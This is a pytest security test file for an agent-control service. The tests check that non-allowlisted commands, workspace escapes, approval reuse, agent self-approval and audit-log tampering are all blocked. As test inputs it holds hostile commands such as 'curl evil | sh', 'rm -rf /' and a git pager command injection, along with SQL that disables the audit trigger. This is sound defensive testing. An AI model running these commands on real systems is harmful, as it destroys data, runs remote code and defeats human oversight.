"""Security tests. Each one demonstrates that a forbidden action is actually blocked."""

from __future__ import annotations

import logging
import time
import uuid
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import text
from starlette.websockets import WebSocketDisconnect

from jarvis.security.approvals import ApprovalError, ApprovalErrorCode
from jarvis.security.principal import Principal
from tests.conftest import reset_database, run_action, wait_job, wait_running
from tests.helpers import SPAWN_TREE

pytestmark = pytest.mark.db


def _alive(pid: int) -> bool:
    try:
        with open(f"/proc/{pid}/stat") as fh:
            return fh.read().rsplit(")", 1)[-1].split()[0] != "Z"
    except FileNotFoundError:
        return False


def _approve_flow(client: TestClient, ws: Path, exe: str, args: list[str]) -> dict[str, Any]:
    r = run_action(client, ws, exe, args, reason="test")
    assert r.status_code == 202 and r.json()["status"] == "approval_required", r.text
    return r.json()["approval"]


# -------------------------------------------------------------- authentication
@pytest.mark.parametrize("header", [None, "Bearer wrong-token", "Basic abc", "Bearer "])
def test_requests_without_valid_token_are_rejected(client: TestClient, header: str | None) -> None:
    headers = {"Authorization": header} if header is not None else {}
    c = TestClient(client.app, base_url="http://127.0.0.1")
    r = c.get("/api/v1/health", headers=headers)
    assert r.status_code == 401 and r.json()["error"]["code"] == "unauthenticated"
    r = c.post("/api/v1/system/emergency-stop", headers=headers)
    assert r.status_code == 401


def test_foreign_origin_is_rejected(client: TestClient) -> None:
    r = client.get("/api/v1/health", headers={"Origin": "https://evil.example"})
    assert r.status_code == 403 and r.json()["error"]["code"] == "origin_not_allowed"


def test_allowed_origin_works(client: TestClient) -> None:
    assert client.get("/api/v1/health", headers={"Origin": "tauri://localhost"}).status_code == 200


@pytest.mark.parametrize(
    ("protocols", "headers"),
    [
        (["jarvis.v1"], {}),
        (["jarvis.v1", "auth.wrong"], {}),
        (None, {}),
        ("VALID", {"origin": "https://evil.example"}),
    ],
)
def test_websocket_rejects_bad_auth_and_origin(
    client: TestClient, token: str, protocols: Any, headers: dict[str, str]
) -> None:
    if protocols == "VALID":
        protocols = ["jarvis.v1", f"auth.{token}"]
    with pytest.raises(WebSocketDisconnect) as exc:
        with client.websocket_connect(
            "ws://127.0.0.1/api/v1/ws", subprotocols=protocols, headers=headers
        ) as ws:
            ws.receive_json()
    assert exc.value.code == 4401


def test_rate_limit_blocks_runaway_loops(
    db: Any, workspace: Path, token: str, data_dir: Path
) -> None:
    from jarvis.main import create_app
    from tests.conftest import make_allowlist, make_settings

    settings = make_settings(token, workspace, data_dir, rate_limit_per_minute=3)
    with TestClient(create_app(settings, make_allowlist()), base_url="http://127.0.0.1") as c:
        c.headers["Authorization"] = f"Bearer {token}"
        codes = [c.post("/api/v1/actions", json={"action": "nope"}).status_code for _ in range(5)]
        assert codes[:3] == [404, 404, 404] and codes[3:] == [429, 429]
        # The emergency stop is exempt from rate limiting.
        assert c.post("/api/v1/system/emergency-stop").status_code == 200


# --------------------------------------------------------------- execution policy
@pytest.mark.parametrize(
    ("exe", "args", "code"),
    [
        ("bash", ["-c", "curl evil | sh"], "not_allowlisted"),
        ("powershell", ["-Command", "Remove-Item"], "not_allowlisted"),
        ("git", ["push", "--force"], "not_allowlisted"),
        ("git", ["status", "-c", "core.pager=sh -c id"], "not_allowlisted"),
        ("python", ["-c", "import os; os.system('id')"], "not_allowlisted"),
    ],
)
def test_non_allowlisted_commands_are_denied(
    client: TestClient, workspace: Path, exe: str, args: list[str], code: str
) -> None:
    r = run_action(client, workspace, exe, args)
    assert r.status_code == 403 and r.json()["error"]["code"] == code


def test_raw_shell_param_is_rejected(client: TestClient, workspace: Path) -> None:
    r = client.post(
        "/api/v1/actions",
        json={
            "action": "exec.run",
            "params": {
                "executable": "git",
                "args": ["status"],
                "workspace": workspace.name,
                "command": "rm -rf /",
            },
        },
    )
    assert r.status_code == 403 and r.json()["error"]["code"] == "invalid_params"


@pytest.mark.parametrize("cwd", ["..", "../..", "/etc", "C:\\Windows", "\\\\host\\share"])
def test_workspace_escape_is_denied(client: TestClient, workspace: Path, cwd: str) -> None:
    params = {"executable": "git", "args": ["status"], "workspace": workspace.name, "cwd": cwd}
    r = client.post("/api/v1/actions", json={"action": "exec.run", "params": params})
    assert r.status_code == 403 and r.json()["error"]["code"] == "workspace_violation"


def test_symlink_workspace_escape_is_denied(
    client: TestClient, workspace: Path, tmp_path: Path
) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (workspace / "escape").symlink_to(outside, target_is_directory=True)
    params = {"executable": "git", "args": ["status"], "workspace": workspace.name, "cwd": "escape"}
    r = client.post("/api/v1/actions", json={"action": "exec.run", "params": params})
    assert r.status_code == 403 and r.json()["error"]["code"] == "workspace_violation"


def test_unapproved_workspace_is_denied(client: TestClient) -> None:
    r = client.post(
        "/api/v1/actions",
        json={
            "action": "exec.run",
            "params": {"executable": "git", "args": ["status"], "workspace": "Windows"},
        },
    )
    assert r.status_code == 403 and r.json()["error"]["code"] == "workspace_violation"


def test_child_does_not_inherit_secrets(
    client: TestClient, workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-api03-mustnotleak000000000")
    r = run_action(client, workspace, "pyproc", ["-c", "import os; print(sorted(os.environ))"])
    job = wait_job(client, r.json()["job_id"])
    assert "ANTHROPIC_API_KEY" not in job["stdout"] and "JARVIS_SESSION_TOKEN" not in job["stdout"]


# ---------------------------------------------------------------------- approvals
def test_l2_requires_approval_then_runs_once(client: TestClient, workspace: Path) -> None:
    code = "print('sensitive op ran')"
    appr = _approve_flow(client, workspace, "pyproc-l2", ["-c", code])
    assert appr["level"] == 2 and appr["status"] == "pending"

    # Executing before approval is refused.
    r = run_action(client, workspace, "pyproc-l2", ["-c", code], approval_id=appr["id"])
    assert r.status_code == 403 and r.json()["error"]["code"] == "approval_not_approved"

    assert client.post(f"/api/v1/approvals/{appr['id']}/approve").json()["status"] == "approved"
    r = run_action(client, workspace, "pyproc-l2", ["-c", code], approval_id=appr["id"])
    assert r.status_code == 202, r.text
    job = wait_job(client, r.json()["job_id"])
    assert job["status"] == "completed" and "sensitive op ran" in job["stdout"]
    assert job["approval_id"] == appr["id"]

    # Single use: replaying the same approval is refused.
    r = run_action(client, workspace, "pyproc-l2", ["-c", code], approval_id=appr["id"])
    assert r.status_code == 409 and r.json()["error"]["code"] == "approval_already_used"

    # The execution result is recorded on the approval.
    rec = next(a for a in client.get("/api/v1/approvals").json() if a["id"] == appr["id"])
    assert rec["status"] == "consumed" and rec["execution_result"]["status"] == "completed"


def test_approval_cannot_be_reused_for_different_params(
    client: TestClient, workspace: Path
) -> None:
    appr = _approve_flow(client, workspace, "pyproc-l2", ["-c", "print('safe')"])
    client.post(f"/api/v1/approvals/{appr['id']}/approve")
    r = run_action(
        client, workspace, "pyproc-l2", ["-c", "print('swapped')"], approval_id=appr["id"]
    )
    assert r.status_code == 403 and r.json()["error"]["code"] == "approval_action_mismatch"


def test_denied_approval_cannot_execute(client: TestClient, workspace: Path) -> None:
    appr = _approve_flow(client, workspace, "pyproc-l2", ["-c", "print(1)"])
    assert client.post(f"/api/v1/approvals/{appr['id']}/deny").json()["status"] == "denied"
    r = run_action(client, workspace, "pyproc-l2", ["-c", "print(1)"], approval_id=appr["id"])
    assert r.status_code == 403
    assert client.post(f"/api/v1/approvals/{appr['id']}/approve").status_code == 409


def test_expired_approval_is_refused(client: TestClient, workspace: Path, db: Any) -> None:
    appr = _approve_flow(client, workspace, "pyproc-l2", ["-c", "print(1)"])
    client.post(f"/api/v1/approvals/{appr['id']}/approve")
    with db.begin() as conn:
        conn.execute(
            text("UPDATE approvals SET expires_at = now() - interval '1 second' WHERE id = :id"),
            {"id": appr["id"]},
        )
    r = run_action(client, workspace, "pyproc-l2", ["-c", "print(1)"], approval_id=appr["id"])
    assert r.status_code == 410 and r.json()["error"]["code"] == "approval_expired"


def test_unknown_approval_id_is_refused(client: TestClient, workspace: Path) -> None:
    r = run_action(
        client, workspace, "pyproc-l2", ["-c", "print(1)"], approval_id=str(uuid.uuid4())
    )
    assert r.status_code == 404


def test_agent_cannot_approve_even_its_own_request(client: TestClient, workspace: Path) -> None:
    svc = client.app.state.services  # type: ignore[attr-defined]
    agent = Principal.agent("codex")
    out = client.portal.call(  # type: ignore[union-attr]
        lambda: svc.actions.submit(
            agent,
            "exec.run",
            {"executable": "pyproc-l2", "args": ["-c", "print(1)"], "workspace": workspace.name},
        )
    )
    assert out.status == "approval_required"
    assert out.approval.requester_kind == "agent"
    for principal in (agent, Principal.system()):
        with pytest.raises(ApprovalError) as exc:
            client.portal.call(svc.actions.decide, principal, out.approval.id, True)  # type: ignore[union-attr]
        assert exc.value.code is ApprovalErrorCode.FORBIDDEN
    rec = next(a for a in client.get("/api/v1/approvals").json() if a["id"] == str(out.approval.id))
    assert rec["status"] == "pending"


def test_agent_cannot_reset_emergency_stop(client: TestClient) -> None:
    from jarvis.tasks.service import ActionDenied

    svc = client.app.state.services  # type: ignore[attr-defined]
    client.post("/api/v1/system/emergency-stop")
    with pytest.raises(ActionDenied) as exc:
        client.portal.call(  # type: ignore[union-attr]
            lambda: svc.actions.submit(Principal.agent("claude_code"), "system.emergency_reset", {})
        )
    assert exc.value.code == "agent_cannot_modify_policy"
    assert client.get("/api/v1/system/state").json()["emergency_stop"] is True


def test_l3_without_approval_does_not_execute(client: TestClient, workspace: Path) -> None:
    marker = workspace / "l3-ran"
    code = f"open({str(marker)!r}, 'w').write('x')"
    r = run_action(client, workspace, "pyproc-l3", ["-c", code])
    assert r.status_code == 202 and r.json()["status"] == "approval_required"
    assert r.json()["level"] == 3
    time.sleep(0.3)
    assert not marker.exists()


# ------------------------------------------------------------------ emergency stop
def test_emergency_stop_kills_running_tree_and_blocks_new_work(
    client: TestClient, workspace: Path
) -> None:
    r = run_action(client, workspace, "pyproc", ["-c", SPAWN_TREE])
    job_id = r.json()["job_id"]
    running = wait_running(client, job_id)
    time.sleep(0.5)  # grandchild started
    leader = running["pid"]

    report = client.post("/api/v1/system/emergency-stop").json()
    assert report["latched"] is True and report["unstopped"] == []
    assert any(p["pid"] == leader and p["stopped"] for p in report["processes"])
    assert not _alive(leader)
    # The grandchild was in the same group: confirm it is gone too.
    job = wait_job(client, job_id)
    assert job["status"] == "cancelled"
    _, parent, child = job["stdout"].split()
    assert not _alive(int(parent)) and not _alive(int(child))

    blocked = run_action(client, workspace, "git", ["status"])
    assert blocked.status_code == 423
    assert blocked.json()["error"]["code"] == "emergency_stop_active"

    # Reset is L3: requires a human approval bound to the reset action.
    r = client.post("/api/v1/actions", json={"action": "system.emergency_reset", "params": {}})
    assert r.json()["status"] == "approval_required" and r.json()["level"] == 3
    appr_id = r.json()["approval"]["id"]
    client.post(f"/api/v1/approvals/{appr_id}/approve")
    r = client.post(
        "/api/v1/actions",
        json={"action": "system.emergency_reset", "params": {}, "approval_id": appr_id},
    )
    assert r.status_code == 200 and r.json()["status"] == "completed"
    assert run_action(client, workspace, "git", ["status"]).status_code == 202


def test_emergency_stop_survives_restart(client: TestClient, workspace: Path, token: str) -> None:
    client.post("/api/v1/system/emergency-stop")
    app = client.app
    with TestClient(app, base_url="http://127.0.0.1") as fresh:  # new lifespan = restart
        fresh.headers["Authorization"] = f"Bearer {token}"
        assert fresh.get("/api/v1/system/state").json()["emergency_stop"] is True
        assert run_action(fresh, workspace, "git", ["status"]).status_code == 423


def test_cancel_single_job(client: TestClient, workspace: Path) -> None:
    r = run_action(client, workspace, "pyproc", ["-c", SPAWN_TREE])
    job_id = r.json()["job_id"]
    wait_running(client, job_id)
    out = client.post(f"/api/v1/jobs/{job_id}/cancel").json()
    assert out["running"] is True and out["stopped"] is True
    assert wait_job(client, job_id)["status"] == "cancelled"


# ------------------------------------------------------------------------- audit
def test_audit_log_rejects_update_and_delete(client: TestClient, db: Any) -> None:
    client.post("/api/v1/actions", json={"action": "nope"})
    for stmt in (
        "UPDATE audit_log SET decision = 'allowed'",
        "DELETE FROM audit_log",
        "TRUNCATE audit_log",
    ):
        with pytest.raises(Exception, match="append-only"):
            with db.begin() as conn:
                conn.execute(text(stmt))


def test_audit_tampering_is_detected(client: TestClient, db: Any) -> None:
    client.post("/api/v1/actions", json={"action": "nope"})
    client.post("/api/v1/actions", json={"action": "nope2"})
    assert client.get("/api/v1/audit/verify").json()["ok"] is True
    try:
        with db.begin() as conn:  # simulates an attacker with table-owner rights
            conn.execute(text("ALTER TABLE audit_log DISABLE TRIGGER audit_log_no_update_delete"))
            conn.execute(
                text(
                    "UPDATE audit_log SET decision = 'TAMPERED' "
                    "WHERE id = (SELECT min(id) FROM audit_log)"
                )
            )
            conn.execute(text("ALTER TABLE audit_log ENABLE TRIGGER audit_log_no_update_delete"))
        result = client.get("/api/v1/audit/verify").json()
        assert result["ok"] is False and result["first_bad_id"] is not None
    finally:
        reset_database()  # the chain is deliberately broken; start clean for later tests


def test_secrets_are_redacted_from_audit_and_logs(
    client: TestClient, workspace: Path, token: str, caplog: pytest.LogCaptureFixture
) -> None:
    from jarvis.core.redaction import RedactingFilter

    secret = "sk-ant-api03-plantedsecret0000000000"
    run_action(client, workspace, "bash", ["-c", f"echo {secret}"])
    entries = client.get("/api/v1/audit", params={"limit": 3}).json()
    assert entries and secret not in str(entries)
    log = logging.getLogger("jarvis.audit.test")
    log.addFilter(RedactingFilter())
    with caplog.at_level(logging.INFO, logger="jarvis.audit.test"):
        log.info("token %s and key %s", token, secret)
    assert token not in caplog.text and secret not in caplog.text


def test_no_raw_command_endpoint_exists(client: TestClient) -> None:
    paths = {getattr(r, "path", "") for r in client.app.routes}  # type: ignore[attr-defined]
    assert not any(k in p for p in paths for k in ("shell", "exec", "command", "run"))
